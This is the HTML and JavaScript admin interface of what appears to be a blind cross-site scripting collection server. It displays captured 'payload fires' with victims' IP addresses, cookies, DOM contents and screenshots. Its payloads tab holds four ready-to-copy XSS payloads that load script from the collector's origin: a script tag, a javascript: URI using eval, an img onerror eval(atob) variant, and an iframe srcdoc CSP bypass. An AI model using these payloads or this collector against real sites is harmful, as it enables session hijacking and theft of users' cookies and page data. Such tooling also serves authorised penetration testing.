<!DOCTYPE html>
<html>
<head>
    <title>Admin Page</title>
    <style>
        body {
            background-color: #03396c;
            color: #b3cde0;
        }
        
        table, th, td {
            border-collapse: collapse;
            border: 1px solid #ddd;
            /* background-color: #005b96; */
        }

        th, td {
            padding: 10px;
            text-align: left;
        }

        th {
            background-color: #011f4b;
            color: white;
        }

        tr:nth-child(even) {
            background-color: #004878;
        }

        tr:nth-child(odd) {
            background-color: #005b96;
        }

        input[type="text"] {
            padding: 10px;
            margin-bottom: 20px;
            border: none;
            border-radius: 5px;
            width: 97%;
        }

        .flex-table {
            display: flex;
            flex-direction: column;
        }

        .invisible {
            display: none;
        }

        .value_cell {
            width: 85%;
        }

        .navbar {
            border-radius: 10px;
            background-color: #011f4b;
            color: white;
            padding: 8px 5px;
            border: none;
            cursor: pointer;
        }

        .navbar:hover {
            background-color: #00183c;
        }
        
        .modal {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.5);
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: scroll;
        }

        .modal_div {
            background-color: #03396c;
            margin: auto;
            padding: 20px;
            width: 80%;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            overflow: auto;
        }

        .action_button {
            background-color: #6497b1;
            color: white;
            padding: 10px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }

        .action_button:hover {
            /* background-color: #0056b3; */
            background-color: #4a7d96;
        }

        .close_button {
            background-color: #dc3545;
            color: white;
            padding: 10px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            position: absolute;
            right: 10%;
        }

        .close_button:hover {
            background-color: #c82333;
        }

        .payload_fires_title_cell {
            font-weight: bold;
        }

        .payload_fires_cell {
            padding: 10px;
            border-bottom: 1px solid #dee2e6;
        }

        #settingsTable {
            margin-bottom: 10px;
        }

        .settings_cell {
            padding: 10px;
            border-bottom: 1px solid #dee2e6;
        }

        .payload_div {
            padding: 10px;
            padding-bottom: 20px;
            border-bottom: 1px solid #dee2e6;
        }

        .payload_title {
            font-weight: bold;
        }

        .payload_description {
            padding-bottom: 10px;
        }

        .payload_code {
            padding: 10px;
            border: 1px solid #dee2e6;
            border-radius: 5px;
            cursor: pointer;
        }

        .payload_code:hover {
            background-color: #00183c;
        }

        .payload_author {
            cursor: pointer;
            text-decoration: underline;
        }

        .payload_author:hover {
            color: #007bff;
        }

        .modal_element_div {
            padding-top: 4px;
            padding-bottom: 4px;
            overflow: scroll;

        }

        .modal_element_label {
            display: inline;
            font-weight: bold;
        }

        .modal_element_item {
            display: inline;
        }

        .image {
            background-color: white;
        }

        .thumbnail {
            background-color: white;
            width: 100px;
            height: 100px;
        }

    </style>
</head>
<body>
    <div id="navvar">
        <button class="navbar" onclick="navbar('payload_fires')">Payload Fires</button>
        <button class="navbar" onclick="navbar('collected_pages')">Collected Pages</button>
        <button class="navbar" onclick="navbar('settings')">Settings</button>
        <button class="navbar" onclick="navbar('payloads')">Payloads</button>
    </div>
    <div id="payload_fires" class="flex-table">
        <h1>Admin Page</h1>
        <table class="payload_fires_table" id="payloadFiresTable">
            <tr class="payload_fires_header">
                <th class="payload_fires_title_cell">ID</th>
                <th class="payload_fires_title_cell">Image</th>
                <th class="payload_fires_title_cell">URI</th>
                <th class="payload_fires_title_cell">Expand</th>
            </tr>
        </table>
    </div>
    <div id="collected_pages" class="flex-table invisible">
        <h1>Collected Pages</h1>
    </div>
    <div id="settings" class="flex-table invisible">
        <h1>Settings</h1>
        <form id="settings_form">
            <table id="settingsTable">
                <tr>
                    <th>Key</th>
                    <th>Value</th>
                </tr>
            </table>
            <input class="action_button" type="submit" value="Save">
        </form>
    </div>
    <div id="payloads" class="flex-table invisible">
        <h1 style="margin-bottom:0px;">Payloads</h1>
        <h3 style="margin:0px;">Click Desired Payload to Copy to Clipboard</h3>
        <div id="payloadsTable">
        </div>
    </div>
    <script>
        function loadPayloadFires() {
            var page = 1;
            var limit = 10;
            fetch(`/api/v1/payloadfires?page=${page}&limit=${limit}`, {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json'
                }
            })
            .then(response => response.json())
            .then(data => {
                const table = document.getElementById('payloadFiresTable');
                data.forEach(item => {
                    const row = make_table_row(table, 'payload_fires_row');
                    make_table_cell(item.id, row, 'payload_fires_cell');
                    make_table_cell(item.url, row, 'payload_fires_cell');
                    make_table_cell(null, row, 'payload_fires_cell').appendChild(make_image(item.screenshot_id, 'Screenshot', null, 'thumbnail'));
                    const actionCell = make_table_cell(null, row, 'payload_fires_cell');
                    make_element('button', 'Expand', actionCell, 'action_button', function() {
                        expandPayloadFire(item);
                    });
                });
            });
        }

        function expandPayloadFire(payloadFire) {
            const modal = make_modal('modal');

            const modalContent = make_div('modal_div', modal);
            make_element('button', 'Close', modalContent, 'close_button', modal.remove.bind(modal));

            make_element('h2', 'Payload Fire', modalContent);

            make_modal_element('b', 'p', `ID: `, payloadFire.id, modalContent);
            make_modal_element('b', 'p', `URL: `, payloadFire.url, modalContent);
            make_image(payloadFire.screenshot_id, payloadFire.screenshot_id, modalContent, 'image');
            make_modal_element('b', 'p', `IP Address: `, payloadFire.ip_address, modalContent);
            make_modal_element('b', 'p', `Referer: `, payloadFire.referer, modalContent);
            make_modal_element('b', 'p', `User Agent: `, payloadFire.user_agent, modalContent);
            make_modal_element('b', 'p', `Cookies: `, payloadFire.cookies, modalContent);
            make_modal_element('b', 'p', `Title: `, payloadFire.title, modalContent);
            make_modal_element('b', 'code', 'DOM: ', payloadFire.dom, modalContent);
            make_modal_element('b', 'p', `Text: `, payloadFire.text, modalContent);
            make_modal_element('b', 'p', `Origin: `, payloadFire.origin, modalContent);
            make_modal_element('b', 'p', `Was Iframe: `, payloadFire.was_iframe, modalContent);
            make_modal_element('b', 'p', `Browser Timestamp: `, payloadFire.browser_timestamp, modalContent);
            make_modal_element('b', 'p', `Correlated Request: `, payloadFire.correlated_request, modalContent);

            // make_element('button', 'Close', modalContent, 'close_button', modal.remove.bind(modal));

            document.body.appendChild(modal);
        }

        function deletePayloadFire(id) {
            console.log('deletePayloadFire', id)
            // var form_data = new FormData();
            // form_data.append("ids", id);

            // fetch('/api/v1/payloadfires', {
            //     method: 'DELETE',
            //     body: form_data
            // })
            // .then(() => {
            //     // Reload the page to get the updated list
            //     location.reload();
            // });
        }

        function loadSettings() {
            if (state.settings) {
                return;
            }
            state.settings = 1;
            fetch('/api/v1/settings', {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json'
                }
            })
            .then(response => response.json())
            .then(data => {
                const table = document.getElementById('settingsTable');
                for (const [key, value] of Object.entries(data)) {
                    state.settings_form[key] = value;
                    if (key === 'SEND_ALERTS') {
                        state.settings_form[key] = value === 'true';
                    }
                    const row = make_table_row(table, 'settings_row');
                    make_settings_table_cell(row, key, value, 'settings_cell');
                }
            });
        }

        document.getElementById('settings_form').addEventListener('submit', function(event) {
            event.preventDefault();
            var inputs = document.getElementById('settingsTable').getElementsByTagName('input');
            for (var i = 0; i < inputs.length; i++) {
                var form_data = new FormData();
                var input = inputs[i];
                var value = input.type === 'checkbox' ? input.checked : input.value;
                if (state.settings_form[input.id] === value) {
                    continue;
                }
                form_data.append('key', input.id);
                form_data.append('value', value);
                fetch('/api/v1/settings', {
                    method: 'PUT',
                    body: form_data
                })
            }
        });

        function makePayloadsTable() {
            if (state.payloads) {
                return;
            }
            state.payloads = 1;
            var payloadsTable = document.getElementById('payloadsTable');
            var payloads = [
                { title: 'Basic Payload', description: 'This is a basic payload', payload: '%3Cscript%20src%3D%27/script_domain/%27%3E%3C%2Fscript%3E' },
                { title: 'Javascript URI', description: 'This is a payload that uses a javascript URI', payload: 'javascript%3Aeval%28%27var%20a%3Ddocument.createElement%28%5C%5C%27script%5C%5C%27%29%3Ba.src%3D%5C%5C%27/script_domain/%5C%5C%27%3Bdocument.body.appendChild%28a%29%27%29' },
                { title: 'IMG Error', description: 'Payload triggers on img error', payload: '%3Cimg%20src%3Dx%20onerror%3Deval%28atob%28this.id%29%29%20id%3D%22/script_base64/%22%3E' },
                { title: 'CSP Bypass', author: '@BRuteLogic', author_link: 'https://twitter.com/BRuteLogic', description: 'Payload against "script-src"', payload: '%3CIframe%20SrcDoc%3D%0A%22%3CScript%20Src%3D/script_domain/%3E%3C%2FScript%3E%22%3E'}
            ]

            payloads.forEach(payload => {
                var domain = window.location.origin;
                var domainWithoutProtocol = window.location.hostname + (window.location.port ? ':' + window.location.port : '');
                var domainBase64 = html_encode(btoa(domain));
                var processedPayload = payload.payload.replace('/script_domain/', domain);
                processedPayload = processedPayload.replace('/script_hostname/', domainWithoutProtocol);
                processedPayload = processedPayload.replace('/script_base64/', domainBase64);

                var URIPayload = decodeURIComponent(processedPayload);
                var payloadDiv = make_div('payload_div', payloadsTable);
                make_element('h2', payload.title, payloadDiv, 'payload_title');
                var description = make_element('p', payload.description, payloadDiv, 'payload_description');
                if (payload.author) {
                    var author = make_element('p', `By ${payload.author} `, description, 'payload_author', function() {
                        window.open(payload.author_link, '_blank');
                    });
                }
                make_element('code', URIPayload, payloadDiv, 'payload_code', function() {
                    copyToClipboard(URIPayload);
                });
            });
        }
        
        function copyToClipboard(text) {
            var textArea = document.createElement("textarea");
            textArea.value = text;
            document.body.appendChild(textArea);
            textArea.select();
            document.execCommand('copy');
            document.body.removeChild(textArea);
        }

        function loadCollectedPages() {
            fetch('/api/v1/collected_pages', {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json'
                }
            })
            .then(response => response.json())
            .then(data => {
                const table = document.getElementById('pagesTable');
                data.forEach(item => {
                    const row = table.insertRow();
                    const idCell = row.insertCell();
                    const uriCell = row.insertCell();
                    const actionCell = row.insertCell();

                    idCell.textContent = item.id;
                    uriCell.textContent = item.uri;

                    const deleteButton = document.createElement('button');
                    deleteButton.textContent = 'Delete';
                    deleteButton.onclick = function() {
                        deleteCollectedPage(item.id);
                    };
                    actionCell.appendChild(deleteButton);
                });
            });
        }

        function deleteCollectedPage(id) {
            var form_data = new FormData();
            form_data.append("ids", id);

            fetch('/api/v1/collected_pages', {
                method: 'DELETE',
                body: form_data
            })
            .then(() => {
                // Reload the page to get the updated list
                location.reload();
            });
        }

        // Load the collected pages when the page loads
        window.onload = loadPayloadFires;
    </script>

    <script>
        var state = {
            payload_fires: 1,
            collected_pages: 0,
            settings: 0,
            payloads: 0,
            settings_form: {},
        };
        function navbar(page) {
            document.getElementById('payload_fires').style.display = 'none';
            document.getElementById('collected_pages').style.display = 'none';
            document.getElementById('settings').style.display = 'none';
            document.getElementById('payloads').style.display = 'none';

            switch (page) {
                case 'payload_fires':
                    document.getElementById('payload_fires').style.display = 'flex';
                    break;
                case 'collected_pages':
                    document.getElementById('collected_pages').style.display = 'flex';
                    break;
                case 'settings':
                    loadSettings();
                    document.getElementById('settings').style.display = 'flex';
                    break;
                case 'payloads':
                    makePayloadsTable();
                    document.getElementById('payloads').style.display = 'flex';
                    break;
                default:
                    break;
            }
        }

        function make_element(tag, text = null, parent = null, style_class = null, onclick_function = null) {
            var element = document.createElement(tag);
            element.textContent = text;
            if (style_class) {
                element.className = style_class;
            }
            if (onclick_function) {
                element.onclick = onclick_function;
            }
            if (parent) {
                parent.appendChild(element);
            }
            return element;
        }

        function make_image(src, alt, parent = null, style_class = null) {
            var image = document.createElement('img');
            image.src = `/screenshots/${src}.png`;
            image.alt = alt;
            if (style_class) {
                image.className = style_class;
            }
            if (parent) {
                parent.appendChild(image);
            }
            return image;
        }

        function make_modal(style_class) {
            var modal = make_element('div', null, null, style_class);
            return modal;
        }

        function make_modal_element(label_tag, item_tag, label, text = null, parent = null, div_style_class = 'modal_element_div', label_style_class = 'modal_element_label', item_style_class = 'modal_element_item', onclick_function = null) {
            var parent_div = make_div(div_style_class, parent);
            var div = make_element(label_tag, label, parent_div, label_style_class, onclick_function)
            var element = make_element(item_tag, text, parent_div, item_style_class, onclick_function);
            return element;
        }

        function make_div(style_class, parent = null) {
            var div = make_element('div', null, parent, style_class);
            return div;
        }

        function make_table(style_class, parent = null) {
            var table = make_element('table', null, parent);
            return table;
        }

        function make_table_row(table, style_class = null) {
            var row = table.insertRow();
            if (style_class) {
                row.className = style_class;
            }
            return row;
        }

        function make_editable_table_cell(value, key, row, is_bool, style_class = null) {
            var cell = row.insertCell();
            var input = document.createElement('input');
        
            input.type = is_bool ? 'checkbox' : 'text';
            if (is_bool) {
                input.checked = value === 'true';
            } else {
                input.value = value;
            }
            input.id = key;
            cell.appendChild(input);
            if (style_class) {
                cell.className = style_class;
            }
            return cell;
        }

        function make_settings_table_cell(row, key, value, style_class = null) {
            var key_cell = make_table_cell(key, row, `${style_class} key_cell`);
            var is_bool = key === 'SEND_ALERTS';
            var value_cell = make_editable_table_cell(value, key, row, is_bool, `${style_class} value_cell`);
        }

        function make_table_cell(text, row, style_class = null) {
            var cell = row.insertCell();
            cell.textContent = text;
            if (style_class) {
                cell.className = style_class;
            }
            return cell;
        }

        function html_encode(value){
            return String(value).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace( /=/g, '&#61;' ).replace( / /g, '&#32;' );
        }
    </script>
</body>
</html>